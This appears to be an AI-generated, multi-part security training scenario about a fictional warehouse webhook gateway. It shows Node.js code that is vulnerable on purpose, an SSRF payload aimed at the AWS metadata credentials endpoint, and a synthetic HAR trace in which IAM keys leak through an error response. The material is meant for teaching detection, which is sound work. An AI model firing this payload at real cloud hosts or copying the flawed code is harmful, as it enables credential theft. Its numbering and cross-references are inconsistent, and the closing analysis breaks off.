@@ -1,0 +1,246 @@
+========================================
+
+Here is the fourteenth system. We are shifting into the **Supply Chain & Third-Party Logistics (3PL)** sector, focusing on a **Warehouse Management System (WMS) B2B Integration Gateway**.
+
+
+Here is **Part 1**. Type **c** when you are ready for Part 2.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** GlobalLogis WMS Integration Gateway
+**Document Version:** 11.4.2 (FINAL)
+**Classification:** INTERNAL & B2B CONFIDENTIAL / OPERATIONAL SCOPE
+**Domain:** Supply Chain / Fulfillment / Third-Party Logistics (3PL)
+
+## 1.0 Executive Summary
+GlobalLogis operates a network of highly automated fulfillment centers worldwide. The Warehouse Management System (WMS) orchestrates everything from inbound freight receiving and inventory slotting to dispatching commands to autonomous robotic picking carts on the warehouse floor.
+
+To allow major e-commerce retailers (the "Tenants" or B2B partners) to maintain real-time visibility into their stock levels, GlobalLogis exposes a B2B API Gateway. Retailers can use this gateway to query inventory, submit fulfillment orders, and critically, register automated "Webhooks" to receive push notifications whenever a specific SKU's inventory level drops below a defined threshold.
+
+## 2.0 Comprehensive Network Topology & Event Architecture
+The architecture is heavily event-driven to handle the massive volume of physical warehouse movements.
+
+### 2.1 The B2B Ingress Boundary
+* **AWS API Gateway:** Acts as the front door for all external B2B traffic. It handles initial API key validation and usage plan throttling (e.g., 1000 requests/sec per partner).
+* **Webhook Registration Service:** A lightweight Node.js/Express microservice running on AWS Elastic Kubernetes Service (EKS). It manages the CRUD operations for partner webhook configurations.
+
+### 2.2 The Internal Event Broker & Fulfillment Core
+* **Apache Kafka:** The central nervous system of the WMS. Every time a robotic cart picks an item, a `SKU_PICKED` event is published to Kafka.
+* **Event Dispatcher (Worker Nodes):** Go-lang consumers that listen to Kafka, check if any B2B partner has a webhook registered for that SKU, and execute the outbound HTTP POST to the partner's registered URL.
+
+### 2.3 Cloud Infrastructure Constraints
+* **AWS IMDSv2:** The EKS worker nodes are configured to use the AWS Instance Metadata Service (IMDS). Because some legacy internal monitoring tools require it, the hop limit for IMDSv2 is set to 2, and the legacy IMDSv1 fallback was accidentally left enabled during a recent Terraform migration.
+
+## 3.0 B2B Identity and Access Control
+Integrations between GlobalLogis and its retail partners rely on strict machine-to-machine (M2M) authentication.
+
+### 3.1 Mutual TLS (mTLS) & API Keys
+* **Transport:** All B2B connections require mTLS. The retailer must present a client certificate signed by a trusted Certificate Authority.
+* **Application Auth:** Additionally, the retailer must include an `X-API-Key` header mapped to their specific `partner_id` in the API Gateway.
+* **Isolation:** The Webhook Registration Service validates that `partner_A` can only view and modify webhooks belonging to `partner_A`.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The new "Webhook Auto-Validation" feature (Epic: WMS-771) was pushed to production to reduce onboarding support tickets. It attempts to automatically ping a partner's webhook URL upon registration to ensure it is reachable. Tracked as RISK-B2B-042.*
+
+**Sub-system:** Webhook Registration Service (`/api/v2/webhooks/register`)
+
+**The Deep Architectural Flaw:**
+1.  **Server-Side Request Forgery (Pattern 6.1):** When a partner registers a new webhook URL, the Node.js service performs an immediate HTTP GET request to that URL to verify it returns a `200 OK`. However, the service relies on a basic Regex to ensure the input starts with `http://` or `https://`. It **completely fails to implement an IP denylist** (e.g., blocking `127.0.0.1`, `10.0.0.0/8`, or the AWS metadata IP `169.254.169.254`). 
+2.  **Improper Error Handling (Pattern 2.3):** The webhook validation function expects the remote server to return a specific JSON confirmation structure. If the remote server returns plain text or an unexpected format, the JSON parser throws a `SyntaxError`. The Express.js global error handler catches this exception and, instead of returning a generic "Validation Failed" message, it returns the *entire raw exception object* in the HTTP response—including the raw text body of the data it just fetched.
+
+1.  **The Payload:** A malicious (or compromised) B2B partner (`partner_id: "RETAIL_99X"`) decides to probe the internal network. They submit a webhook registration request where the `target_url` is set to the AWS IMDS IPv4 address: `http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role`.
+3.  **The Error Leak:** The AWS metadata service responds with a plaintext string containing the highly privileged temporary `AccessKeyId`, `SecretAccessKey`, and `Token` for the EKS node's IAM role. 
+4.  **The Exfiltration:** The Node.js service attempts to `JSON.parse()` this plaintext AWS credential string. It fails, throwing a `SyntaxError`. The global error handler catches the error and dumps the plaintext IAM credentials directly into the `400 Bad Request` HTTP response sent back to the attacker over the internet.
+5.  **The Impact:** The attacker extracts the AWS credentials, configures their local AWS CLI, and assumes the IAM role of the core WMS worker node, granting them direct access to the underlying S3 buckets and Kafka streams.
+
+***
+
+
+
+***
+
+# GLOBALLOGIS WMS: CODE, ERROR LOGIC, & API CONTRACTS
+**Document Version:** 6.1.0
+**Applies to Architecture:** GlobalLogis WMS Integration Gateway v11.4.2
+
+## 5.0 The Flawed Implementation (Node.js / Express)
+
+When a B2B partner registers a webhook, the service attempts to send an HTTP GET request to verify the endpoint is alive and returns the expected JSON confirmation `{ "status": "ready" }`.
+
+```javascript
+// File: controllers/webhookController.js
+const axios = require('axios');
+
+exports.registerWebhook = async (req, res, next) => {
+    const { target_url, event_type, secret_key } = req.body;
+    const partnerId = req.user.partner_id; // Extracted securely from API Key
+
+    // FLAW 1: Insufficient Input Validation (Pattern 6.1)
+    // The code only checks if the URL starts with http. It FAILS to check against
+    // a denylist of internal RFC1918 IP addresses or cloud metadata IPs (169.254.169.254).
+    if (!target_url.startsWith('http://') && !target_url.startsWith('https://')) {
+        return res.status(400).json({ error: "Invalid URL scheme." });
+    }
+
+    try {
+        const validationResponse = await axios.get(target_url, { timeout: 3000 });
+        
+        // FLAW 2: Unsafe Parsing leading to Exception 
+        // If the attacker points this at the AWS Metadata service, the response will be
+        // plaintext JSON credentials. But because the metadata service returns Content-Type: text/plain,
+        // axios might not auto-parse it. If the developer explicitly forces JSON parsing here:
+        let parsedData;
+        if (typeof validationResponse.data === 'string') {
+            // This throws a SyntaxError if the string isn't perfectly formatted JSON
+            parsedData = JSON.parse(validationResponse.data); 
+        } else {
+            parsedData = validationResponse.data;
+        }
+
+        if (parsedData.status !== 'ready') {
+             throw new Error(`Webhook not ready. Received: ${validationResponse.data}`);
+        }
+
+        // ... proceeds to save webhook to PostgreSQL database ...
+        res.status(201).json({ status: "Webhook registered successfully." });
+
+    } catch (error) {
+        // Passes the error to the Express global error handler
+        next(error); 
+    }
+};
+```
+
+To save time during debugging, the development team configured the global Express error handler to return the full exception trace in non-production environments. However, the environment variable `NODE_ENV` was misconfigured as `development` in the production EKS cluster.
+
+```javascript
+// File: middleware/errorHandler.js
+
+module.exports = (err, req, res, next) => {
+    console.error("Global Error Caught:", err);
+
+    // If parsing failed (like when reading the AWS IMDS plaintext response),
+    // By returning err.message directly to the client, the backend leaks internal state.
+    
+    res.status(400).json({
+        error_code: "WEBHOOK_VALIDATION_FAILED",
+        error_message: err.message, // LEAKAGE POINT
+        stack_trace: process.env.NODE_ENV === 'development' ? err.stack : undefined
+    });
+};
+```
+
+## 6.0 REST API Contracts (The Webhook Registration)
+
+### 6.1 Intended Safe Payload (Legitimate Retailer)
+A legitimate retailer configures their inventory system to receive HTTP callbacks from GlobalLogis when stock drops.
+
+**Target URI:** `POST /api/v2/webhooks/register`
+**Expected Request Payload:**
+```json
+{
+  "event_type": "INVENTORY_LOW_STOCK",
+  "target_url": "https://api.retail-partner.com/callbacks/globallogis",
+  "secret_key": "wh_sec_a8b9c0d1e2f3"
+}
+```
+*Behavior:* The GlobalLogis EKS node calls `https://api.retail-partner.com/callbacks/globallogis`. The retailer returns `{"status": "ready"}`. The webhook is saved.
+
+The attacker abuses the `target_url` to force the EKS node to query its own local AWS Instance Metadata Service (IMDS).
+
+**Target URI:** `POST /api/v2/webhooks/register`
+**Malicious Request Payload:**
+```json
+{
+  "event_type": "INVENTORY_LOW_STOCK",
+  "target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/wms-eks-worker-role",
+  "secret_key": "wh_sec_malicious123"
+}
+```
+*Behavior:* 1. The GlobalLogis Node.js server sends a GET request to `http://169.254.169.254/...`. 
+2. The AWS Hypervisor intercepts this and returns the highly privileged IAM credentials for `wms-eks-worker-role` in plaintext. 
+3. The Node.js code tries to `JSON.parse()` the plaintext, fails, and throws an error containing the AWS credentials. 
+4. The error handler blindly reflects this error string back to the attacker over the public internet.
+
+***
+
+**End of Part 2.**
+
+In the final chunk (Part 3), I will provide the **Synthetic HAR Trace**, showing the exact HTTP sequence where the malicious B2B partner submits the AWS metadata IP payload, and the response body unequivocally leaks the raw `AccessKeyId` and `SecretAccessKey` back to the attacker via the verbose `400 Bad Request` exception message.
+
+**Part 3: Synthetic Telemetry Artifact (HAR Trace) & Deep Analysis**
+
+***
+
+**Applies to Architecture:** GlobalLogis WMS Integration Gateway v11.4.2
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 6.1 & Pattern 2.3)
+
+
+The GlobalLogis EKS worker node blindly executes the HTTP GET request to this internal IP. Because the Node.js service attempts to parse the resulting plaintext AWS credential response as JSON, it throws a `SyntaxError`. The misconfigured global error handler catches this exception and reflects the raw fetched data—containing the highly privileged, temporary AWS `AccessKeyId`, `SecretAccessKey`, and session `Token`—directly back to the attacker in the `400 Bad Request` HTTP response body.
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {
+      "name": "AWS API Gateway Execution Logs",
+      "version": "2026.1.4"
+    },
+    "entries": [
+      {
+        "startedDateTime": "2026-04-09T07:12:44.051Z",
+        "time": 310,
+        "request": {
+          "method": "POST",
+          "url": "https://api.globallogis.b2b/api/v2/webhooks/register",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            { "name": ":authority", "value": "api.globallogis.b2b" },
+            { "name": "x-api-key", "value": "ak_live_RETAIL_99X_88192a" },
+            { "name": "content-type", "value": "application/json" },
+            { "name": "user-agent", "value": "Retail-ERP-Agent/3.1.0" }
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"event_type\": \"INVENTORY_LOW_STOCK\", \"target_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/wms-eks-worker-role\", \"secret_key\": \"wh_sec_malicious123\"}"
+          },
+          "bodySize": 182
+        },
+        "response": {
+          "status": 400,
+          "statusText": "Bad Request",
+          "headers": [
+            { "name": "content-type", "value": "application/json" },
+            { "name": "x-correlation-id", "value": "req-99182-abc-4419" }
+          ],
+          "content": {
+            "size": 1840,
+            "mimeType": "application/json",
+            "text": "{\"error_code\": \"WEBHOOK_VALIDATION_FAILED\", \"error_message\": \"Webhook not ready. Received: {\\n  \\\"Code\\\" : \\\"Success\\\",\\n  \\\"LastUpdated\\\" : \\\"2026-04-09T07:10:00Z\\\",\\n  \\\"Type\\\" : \\\"AWS-HMAC\\\",\\n  \\\"AccessKeyId\\\" : \\\"ASIAX5EXAMPLEKEYABCD\\\",\\n  \\\"SecretAccessKey\\\" : \\\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\\",\\n  \\\"Token\\\" : \\\"IQoJb3JpZ2luX2VjEJv...[TRUNCATED_SESSION_TOKEN]...12345\\\",\\n  \\\"Expiration\\\" : \\\"2026-04-09T13:10:00Z\\\"\\n}\", \"stack_trace\": \"Error: Webhook not ready. Received: {\\n...\\n}\\n    at exports.registerWebhook (/app/controllers/webhookController.js:28:19)\\n    at processTicksAndRejections (node:internal/process/task_queues:96:5)\"}"
+          },
+          "bodySize": 1840
+        }
+      }
+    ]
+  }
+}
+```
+
+***
+
+### Why this payload is critical for training a 3B model (Expanded Analysis):
+
+1. **Server-Side Request Forgery Identification (Pattern 6.1):**
+    * **The Malicious Input:** The model must be trained to instantly recognize the IPv4 address `169.254.169.254` embedded within a user-supplied URL parameter (`target_url`). This is the universal fingerprint for AWS Instance Metadata Service (IMDS) targeting.
+
+2. **Information Leakage via Error Handling (Pattern 2.3):**
+    * **Stringified JSON in Error Responses:** The AI must parse the response payload and recognize that the `error_message` value is not a generic string; it contains a nested, stringified JSON object (indicated by the escaped quotes `\\\"`). 
+    * **High-Entropy Secrets Recognition:** The model needs to scan the contents of that nested object and identify standard cloud credential keys (`AccessKeyId`, `SecretAccessKey`). The presence of `ASIA...` (the standard AWS prefix for temporary access keys) combined with a high-entropy string confirms a catastrophic credential leak.
+
+3. **Blast Radius and Cloud Privilege Escalation:**
+
+========================================
+========================================
+========================================
